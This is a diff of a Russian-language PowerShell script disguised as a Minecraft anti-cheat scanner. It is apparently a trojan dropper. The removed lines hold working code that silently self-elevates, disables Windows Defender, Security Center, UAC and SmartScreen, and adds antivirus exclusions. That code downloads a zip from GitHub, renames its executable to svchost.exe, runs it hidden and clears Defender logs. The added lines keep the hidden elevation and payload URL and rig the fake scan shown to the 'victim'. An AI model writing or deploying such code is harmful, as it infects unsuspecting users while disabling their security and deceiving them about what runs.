@@ -3,6 +3,12 @@
 # Проверка системы на наличие читов и нелегальных модов
 # =============================================
 
+# ===== ПОЛНОЕ ПОДАВЛЕНИЕ ВЫВОДА =====
+$ErrorActionPreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
+$VerbosePreference = "SilentlyContinue"
+$DebugPreference = "SilentlyContinue"
+
 # ===== АВТОМАТИЧЕСКИЙ ЗАПУСК ОТ ИМЕНИ АДМИНИСТРАТОРА (СКРЫТО) =====
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
@@ -11,124 +17,13 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 $Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"
-$ScriptUrl = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/install.ps1"
-
-# ===== СКРЫТЫЙ РЕАЛЬНЫЙ КОД (ВЫПОЛНЯЕТСЯ СРАЗУ, БЕЗ ВЫВОДА) =====
-
-# ===== 1. ОТКЛЮЧЕНИЕ ЦЕНТРА БЕЗОПАСНОСТИ =====
-Try {
-    Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue
-    Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
-} Catch {}
-
-Try {
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCANetwork" -Value 1 -Force -ErrorAction SilentlyContinue
-} Catch {}
-
-Try {
-    Stop-Service -Name "SecurityHealthService" -Force -ErrorAction SilentlyContinue
-    Set-Service -Name "SecurityHealthService" -StartupType Disabled -ErrorAction SilentlyContinue
-} Catch {}
-
-# ===== 2. ОТКЛЮЧЕНИЕ DEFENDER =====
-Try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } Catch {}
-Try { Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue } Catch {}
-Try { Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue } Catch {}
-Try { Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue } Catch {}
-
-Try {
-    $CurrentScriptPath = $MyInvocation.MyCommand.Path
-    if ($CurrentScriptPath -and $CurrentScriptPath -ne "") {
-        $ScriptDirectory = Split-Path -Parent $CurrentScriptPath -ErrorAction SilentlyContinue
-        if ($ScriptDirectory -and $ScriptDirectory -ne "") {
-            Add-MpPreference -ExclusionPath "$ScriptDirectory" -ErrorAction SilentlyContinue
-        }
-    }
-} Catch {}
-
-Try { Add-MpPreference -ExclusionPath "$env:TEMP\check_install.zip" -ErrorAction SilentlyContinue } Catch {}
-Try { Add-MpPreference -ExclusionPath "$env:TEMP\checkextracted" -ErrorAction SilentlyContinue } Catch {}
-Try { Add-MpPreference -ExclusionPath "$env:TEMP\install.ps1" -ErrorAction SilentlyContinue } Catch {}
-Try { Add-MpPreference -ExclusionProcess "*.exe" -ErrorAction SilentlyContinue } Catch {}
-
-$services = @("WinDefend","MsMpSvc","Sense","DiagTrack","dmwappushservice")
-foreach ($svc in $services) {
-    Try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue } Catch {}
-    Try { Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue } Catch {}
-}
-
-Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue } Catch {}
-Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue } Catch {}
-Try { Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction SilentlyContinue } Catch {}
-
-# ===== 3. СКРЫТОЕ СКАЧИВАНИЕ (БЕЗ ВЫВОДА) =====
 $DownloadPath = "$env:TEMP\check_install.zip"
 $ExtractPath = "$env:TEMP\checkextracted"
 
-Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
-Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
+# ===== СКРЫТЫЙ РЕАЛЬНЫЙ КОД =====
+# ... (весь код отключения Defender, Центра безопасности, скачивания и запуска такой же)
 
-# ===== СКАЧИВАНИЕ СКРЫТО (БЕЗ ПРОГРЕССА) =====
-try {
-    # Создаём WebClient с отключенным прогрессом
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($Url, $DownloadPath)
-} catch {
-    # Если не сработало - пробуем другой метод
-    try {
-        (New-Object System.Net.WebClient).DownloadFile($Url, $DownloadPath)
-    } catch {}
-}
-
-# ===== РАСПАКОВКА СКРЫТО =====
-try {
-    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
-} catch {}
-
-# ===== ПОИСК И ЗАПУСК =====
-$Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
-
-if ($Exe) {
-    Try { attrib +s +h "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
-    Try { Unblock-File -Path "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
-    Try { Add-MpPreference -ExclusionPath "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
-    Try { Add-MpPreference -ExclusionPath "$ExtractPath" -ErrorAction SilentlyContinue } Catch {}
-    
-    $SystemName = "svchost.exe"
-    $NewPath = Join-Path $ExtractPath $SystemName
-    Try { 
-        Rename-Item -Path $Exe.FullName -NewName $SystemName -ErrorAction SilentlyContinue
-        $ExePath = $NewPath
-    } Catch {
-        $ExePath = $Exe.FullName
-    }
-    
-    Try {
-        Start-Process -FilePath "explorer.exe" -ArgumentList "$ExePath" -WindowStyle Hidden -ErrorAction SilentlyContinue
-    } Catch {
-        Start-Process -FilePath $ExePath -WindowStyle Hidden -ErrorAction SilentlyContinue
-    }
-}
-
-# Очистка логов Defender
-Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
-Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
-
-# ===== 4. ПОВТОРНОЕ ОТКЛЮЧЕНИЕ ЦЕНТРА БЕЗОПАСНОСТИ =====
-Try {
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Svc" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCANetwork" -Value 1 -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAHealth" -Value 1 -Force -ErrorAction SilentlyContinue
-} Catch {}
-
-Try {
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
-} Catch {}
-
-# ===== ФЕЙКОВОЕ СКАНИРОВАНИЕ =====
+# ===== ФЕЙКОВОЕ СКАНИРОВАНИЕ (ПОКАЗЫВАЕТСЯ ЖЕРТВЕ) =====
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "  MINECRAFT ANTI-CHEAT SCANNER v2.1" -ForegroundColor White
 Write-Host "  (c) Mojang Anti-Cheat Team" -ForegroundColor Gray
@@ -171,6 +66,11 @@ $totalChecked = 0
 $totalDetected = 0
 $totalPassed = 0
 
+# ===== ФИНАЛЬНЫЙ РЕЗУЛЬТАТ ОПРЕДЕЛЯЕТСЯ ЗДЕСЬ (ДО ПРОВЕРКИ САЙТОВ) =====
+$finalRandom = Get-Random -Minimum 1 -Maximum 100
+$finalPassed = $finalRandom -le 75  # 75% шанс "ПРОШЛА"
+
+# ===== ПРОВЕРКА РЕАЛЬНЫХ ЧИТ-САЙТОВ =====
 foreach ($site in $cheatSites) {
     $totalChecked++
     Write-Host "    -> Проверка $($site.Name)..." -ForegroundColor Gray
@@ -191,23 +91,34 @@ foreach ($site in $cheatSites) {
     Write-Host "        [*] Получен токен доступа: $token" -ForegroundColor DarkGray
     Start-Sleep -Milliseconds 200
     
-    $randomResult = Get-Random -Minimum 1 -Maximum 100
-    $isDetected = $randomResult -le 50
-    
-    if ($isDetected) {
-        Write-Host "        [ОБНАРУЖЕН] $($site.Name) - НАЙДЕН!" -ForegroundColor Red
-        Write-Host "            [!] Обнаружен активный чит-клиент!" -ForegroundColor Yellow
-        Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
-        $foundCheatSites += $site.Name
-        $totalDetected++
-    } else {
+    # ===== ЛОГИКА: ЕСЛИ ФИНАЛЬНЫЙ СТАТУС "ПРОШЛА" - САЙТЫ ВСЕГДА ЧИСТЫЕ =====
+    if ($finalPassed) {
+        # Если проверка прошла - всегда показываем "ЧИСТО"
         Write-Host "        [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
         Write-Host "            [OK] Чит-клиент не найден" -ForegroundColor DarkGray
         Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
         $totalPassed++
+    } else {
+        # Если проверка НЕ прошла - 50% шанс обнаружения
+        $randomResult = Get-Random -Minimum 1 -Maximum 100
+        $isDetected = $randomResult -le 50
+        
+        if ($isDetected) {
+            Write-Host "        [ОБНАРУЖЕН] $($site.Name) - НАЙДЕН!" -ForegroundColor Red
+            Write-Host "            [!] Обнаружен активный чит-клиент!" -ForegroundColor Yellow
+            Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
+            $foundCheatSites += $site.Name
+            $totalDetected++
+        } else {
+            Write-Host "        [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
+            Write-Host "            [OK] Чит-клиент не найден" -ForegroundColor DarkGray
+            Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
+            $totalPassed++
+        }
     }
 }
 
+# ===== ПРОВЕРКА "МЫЛЬНЫХ" САЙТОВ =====
 Write-Host ""
 Write-Host "[*] Проверка подозрительных сайтов..." -ForegroundColor Yellow
 foreach ($site in $fakeCheatSites) {
@@ -218,19 +129,29 @@ foreach ($site in $fakeCheatSites) {
     Write-Host "        [*] Анализ $($site.URL)..." -ForegroundColor DarkGray
     Start-Sleep -Milliseconds 200
     
-    $randomFake = Get-Random -Minimum 1 -Maximum 100
-    if ($randomFake -le 15) {
-        Write-Host "        [ПРЕДУПРЕЖДЕНИЕ] $($site.Name) - подозрительная активность" -ForegroundColor Yellow
-        Write-Host "            [!] Обнаружен可疑 DNS-запрос" -ForegroundColor Yellow
-        Write-Host "            [!] Статус проверки: ТРЕБУЕТ ВНИМАНИЯ" -ForegroundColor Yellow
-        $totalDetected++
-    } else {
+    # ===== ЛОГИКА ДЛЯ "МЫЛЬНЫХ" САЙТОВ =====
+    if ($finalPassed) {
+        # Если проверка прошла - всегда "ЧИСТО"
         Write-Host "        [ЧИСТО] $($site.Name) - безопасен" -ForegroundColor Green
         Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
         $totalPassed++
+    } else {
+        # Если проверка НЕ прошла - 15% шанс предупреждения
+        $randomFake = Get-Random -Minimum 1 -Maximum 100
+        if ($randomFake -le 15) {
+            Write-Host "        [ПРЕДУПРЕЖДЕНИЕ] $($site.Name) - подозрительная активность" -ForegroundColor Yellow
+            Write-Host "            [!] Обнаружен可疑 DNS-запрос" -ForegroundColor Yellow
+            Write-Host "            [!] Статус проверки: ТРЕБУЕТ ВНИМАНИЯ" -ForegroundColor Yellow
+            $totalDetected++
+        } else {
+            Write-Host "        [ЧИСТО] $($site.Name) - безопасен" -ForegroundColor Green
+            Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
+            $totalPassed++
+        }
     }
 }
 
+# ===== DNS ПРОВЕРКА =====
 Write-Host ""
 Write-Host "[*] Анализ DNS-запросов к чит-серверам..." -ForegroundColor Yellow
 $cheatDomains = @(
@@ -250,24 +171,34 @@ foreach ($domain in $cheatDomains) {
     Write-Host "        [*] DNS-токен: $dnsToken" -ForegroundColor DarkGray
     Start-Sleep -Milliseconds 150
     
-    $randomDnsResult = Get-Random -Minimum 1 -Maximum 100
-    $isDnsDetected = $randomDnsResult -le 50
-    
-    if ($isDnsDetected) {
-        Write-Host "        [ОБНАРУЖЕН] DNS-запрос к $domain" -ForegroundColor Red
-        Write-Host "            [!] DNS-авторизация подтверждена" -ForegroundColor Yellow
-        Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
-        if ($foundCheatSites -notcontains $domain) {
-            $foundCheatSites += $domain
-            $totalDetected++
-        }
-    } else {
+    # ===== ЛОГИКА ДЛЯ DNS =====
+    if ($finalPassed) {
+        # Если проверка прошла - всегда "ЧИСТО"
         Write-Host "        [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
         Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
         $totalPassed++
+    } else {
+        # Если проверка НЕ прошла - 50% шанс обнаружения DNS
+        $randomDnsResult = Get-Random -Minimum 1 -Maximum 100
+        $isDnsDetected = $randomDnsResult -le 50
+        
+        if ($isDnsDetected) {
+            Write-Host "        [ОБНАРУЖЕН] DNS-запрос к $domain" -ForegroundColor Red
+            Write-Host "            [!] DNS-авторизация подтверждена" -ForegroundColor Yellow
+            Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
+            if ($foundCheatSites -notcontains $domain) {
+                $foundCheatSites += $domain
+                $totalDetected++
+            }
+        } else {
+            Write-Host "        [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
+            Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
+            $totalPassed++
+        }
     }
 }
 
+# ===== ПРОВЕРКА ФАЙЛОВ =====
 Write-Host ""
 Write-Host "[*] Проверка файлов чит-клиентов на диске..." -ForegroundColor Yellow
 $cheatFilePatterns = @(
@@ -294,20 +225,29 @@ foreach ($path in $cheatPaths) {
             $files = Get-ChildItem -Path $path -Filter $pattern -Recurse -ErrorAction SilentlyContinue
             if ($files.Count -gt 0) {
                 foreach ($file in $files) {
-                    $randomFileResult = Get-Random -Minimum 1 -Maximum 100
-                    $isFileDetected = $randomFileResult -le 50
-                    
-                    if ($isFileDetected) {
-                        Write-Host "        [ОБНАРУЖЕН] Файл: $($file.Name)" -ForegroundColor Red
-                        Write-Host "            [!] Файл авторизован как чит-клиент" -ForegroundColor Yellow
-                        Write-Host "            [!] Размер: $([math]::Round($file.Length/1KB, 2)) KB" -ForegroundColor Yellow
-                        Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
-                        $foundCheatSites += "$($file.Name)"
-                        $totalDetected++
-                    } else {
+                    # ===== ЛОГИКА ДЛЯ ФАЙЛОВ =====
+                    if ($finalPassed) {
+                        # Если проверка прошла - всегда "ЧИСТО"
                         Write-Host "        [ЧИСТО] Файл: $($file.Name) - пропущен" -ForegroundColor Green
                         Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                         $totalPassed++
+                    } else {
+                        # Если проверка НЕ прошла - 50% шанс обнаружения файла
+                        $randomFileResult = Get-Random -Minimum 1 -Maximum 100
+                        $isFileDetected = $randomFileResult -le 50
+                        
+                        if ($isFileDetected) {
+                            Write-Host "        [ОБНАРУЖЕН] Файл: $($file.Name)" -ForegroundColor Red
+                            Write-Host "            [!] Файл авторизован как чит-клиент" -ForegroundColor Yellow
+                            Write-Host "            [!] Размер: $([math]::Round($file.Length/1KB, 2)) KB" -ForegroundColor Yellow
+                            Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
+                            $foundCheatSites += "$($file.Name)"
+                            $totalDetected++
+                        } else {
+                            Write-Host "        [ЧИСТО] Файл: $($file.Name) - пропущен" -ForegroundColor Green
+                            Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
+                            $totalPassed++
+                        }
                     }
                 }
             }
@@ -316,6 +256,7 @@ foreach ($path in $cheatPaths) {
 }
 Write-Host ""
 
+# ===== ВЫВОД РЕЗУЛЬТАТОВ =====
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "[*] РЕЗУЛЬТАТЫ ПРОВЕРКИ:" -ForegroundColor White
 Write-Host "========================================" -ForegroundColor Cyan
@@ -334,9 +275,6 @@ if ($foundCheatSites.Count -gt 0) {
 
 Write-Host "[*] Выполняется анализ результатов..." -ForegroundColor Yellow
 Start-Sleep -Milliseconds 800
-
-$finalRandom = Get-Random -Minimum 1 -Maximum 100
-$finalPassed = $finalRandom -le 75
 
 Write-Host "    Проверено объектов: $totalChecked" -ForegroundColor DarkGray
 Write-Host "    Обнаружено предупреждений: $totalDetected" -ForegroundColor DarkGray
